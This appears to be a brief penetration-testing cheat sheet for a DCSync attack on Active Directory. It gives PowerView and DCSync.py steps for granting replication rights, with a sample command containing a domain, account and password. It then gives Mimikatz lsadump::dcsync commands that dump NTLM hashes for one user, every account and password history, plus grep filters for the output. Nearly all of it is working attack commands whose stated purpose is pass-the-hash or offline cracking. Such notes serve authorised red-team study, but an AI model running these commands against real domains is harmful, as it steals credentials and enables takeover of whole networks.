To perform a DCSync you need ***GenericAll/GenericWrite*** permission on a user that can talk to a DC.
If you need to add the permissions you can do...
1)From Windows:
```
Upload Powerview.ps1 and add the permission to your user.
Next perform a DCSync via impacketer-secretsdump
```
2)From Linux(https:### github.com/n00py/DCSync):
```
pip3 install pywerview
apt install heimdal-dev -y
apt install libkrb5-dev -y
python3 -m pip install gssapi
DCSync.py -dc dc01.n00py.local -t 'CN=spoNge369,CN=Users,DC=n00py,DC=local' 'n00py.local\user_with_writeDACL:P@$$w0rd123'
```


## Dump password hashes from DC-Sync via Mimikatz
(useful for PasstheHash or offline crack)
### Run Mimikatz
```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```
### Dump password hash for a sigular user
```
lsadump::dcsync /domain:**FQDN** /user:**username**
```
### Dump password hash from all accounts
```
log <username>_dcdump.txt 
lsadump::dcsync /domain:**FQDN** /all

Then filter results
cat <username>_dcdump.txt | grep "SAM Username"
cat <username>_dcdump.txt | grep "Hash NTLM"
```
### Check password history(useful for old passwords)
```
lsadump::dcsync /domain:**FQDN** /all /history
```